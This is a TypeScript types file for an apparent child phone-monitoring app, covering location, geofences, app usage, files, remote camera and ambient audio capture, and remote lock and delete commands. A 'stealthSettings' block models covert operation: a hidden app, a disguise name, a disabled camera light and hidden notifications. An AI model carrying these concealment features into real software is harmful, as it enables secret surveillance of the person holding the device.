export type ViewMode = 'parent' | 'child';

export type ActiveTab = 
  | 'location' 
  | 'screen' 
  | 'camera' 
  | 'audio' 
  | 'apps' 
  | 'files' 
  | 'history' 
  | 'stealth';

export type CameraPosition = 'front' | 'back' | 'off';

export interface DeviceSummary {
  deviceId: string;
  pairingCode: string;
  deviceModel: string;
  childName: string;
  isOnline: boolean;
  batteryLevel: number;
  lastSeen: string;
}

export interface LocationData {
  lat: number;
  lng: number;
  address: string;
  speed: number; // km/h
  accuracy: number; // meters
  altitude?: number;
  timestamp: string;
  batteryAtLocation: number;
}

export interface GeofenceZone {
  id: string;
  name: string;
  lat: number;
  lng: number;
  radiusMeters: number;
  type: 'safe' | 'restricted';
  activeAlert: boolean;
  createdAt?: string;
}

export interface AppUsageItem {
  id: string;
  appName: string;
  packageName: string;
  category: 'Social' | 'Games' | 'Education' | 'System' | 'Browser' | 'Entertainment';
  durationMinutes: number;
  lastUsed: string;
  isBlocked: boolean;
  isFlagged: boolean;
  icon: string;
}

export interface DeviceFile {
  id: string;
  name: string;
  folder: 'Photos' | 'Downloads' | 'Documents' | 'Voice Recordings' | 'App Media';
  size: string;
  date: string;
  previewUrl?: string;
  dataUrl?: string; // base64 or object URL for real inspection & download
  isFlagged?: boolean;
}

export interface AudioClipItem {
  id: string;
  title: string;
  timestamp: string;
  duration: string;
  transcript: string;
  audioData?: string; // base64 data url for real playback
  severity: 'safe' | 'warning' | 'danger';
}

export interface ActivityLog {
  id: string;
  timestamp: string;
  type: 'location' | 'app_used' | 'safety_alert' | 'lock' | 'camera_snapshot' | 'audio_listen' | 'sos' | 'file_access' | 'permission' | 'geofence';
  title: string;
  message: string;
  severity: 'info' | 'warning' | 'danger';
}

export interface AISafetyReport {
  timestamp: string;
  riskLevel: RiskLevel;
  safetyScore: number; // 0 - 100 (100 = completely safe)
  detectedCategories: string[];
  summary: string;
  flaggedText?: string;
  suggestedAction: string;
}

export interface AudioListeningState {
  isListening: boolean;
  decibelLevel: number;
  audioMode: 'ambient' | 'surrounding_talk' | 'off';
  lastTranscript?: string;
  recordedClipsCount: number;
  recordedClips: AudioClipItem[];
}

export interface ChildDeviceState {
  deviceId: string;
  pairingCode: string;
  childName: string;
  childAge: number;
  deviceModel: string;
  osVersion: string;
  isOnline: boolean;
  lastSeen: string;
  batteryLevel: number;
  isCharging: boolean;
  wifiName: string;
  storageUsedPercent: number;
  storageUsedGB: number;
  storageTotalGB: number;
  
  // Real-time Controls & Feeds
  location: LocationData;
  locationHistory: LocationData[];
  geofences: GeofenceZone[];
  
  isLocked: boolean;
  lockReason: string;
  customLockMessage: string;
  
  activeCamera: CameraPosition;
  isCameraStreaming: boolean;
  latestCameraSnapshot: string | null;
  cameraSnapshotTimestamp?: string;
  cameraSnapshots: Array<{ id: string; url: string; timestamp: string; camera: CameraPosition }>;
  
  // Real-time Audio Listening
  audioState: AudioListeningState;

  isScreenMonitoring: boolean;
  currentApp: string;
  currentScreenTitle: string;
  currentScreenContent: string;
  currentScreenImage: string | null;
  
  aiSafetyStatus: AISafetyReport;
  
  blockedApps: string[];
  appUsageLogs: AppUsageItem[];
  
  fileSystem: DeviceFile[];
  activityHistory: ActivityLog[];
  
  stealthSettings: {
    autoHideApp: boolean;
    isAppHidden: boolean;
    disguiseName: string;
    sensorLightDisabled: boolean;
    hideNotificationBadge: boolean;
    runInBackground: boolean;
    permissionsGranted: {
      location: boolean;
      camera: boolean;
      microphone: boolean;
      storage: boolean;
      accessibility: boolean;
      deviceAdmin: boolean;
      usageStats: boolean;
      drawOverApps: boolean;
    };
  };
}

export interface RemoteCommandRequest {
  deviceId: string;
  command: 
    | 'LOCK_SCREEN' 
    | 'UNLOCK_SCREEN' 
    | 'TRIGGER_SIREN' 
    | 'SET_CAMERA' 
    | 'CAPTURE_SNAPSHOT' 
    | 'TOGGLE_AUDIO_LISTEN'
    | 'SAVE_AUDIO_CLIP'
    | 'CAPTURE_SCREEN' 
    | 'TOGGLE_APP_BLOCK' 
    | 'UPDATE_LOCATION' 
    | 'ADD_GEOFENCE'
    | 'DELETE_GEOFENCE'
    | 'UPLOAD_FILE'
    | 'DELETE_FILE'
    | 'TRIGGER_SOS' 
    | 'RUN_AI_SCAN'
    | 'PAIR_DEVICE';
  payload?: any;
}
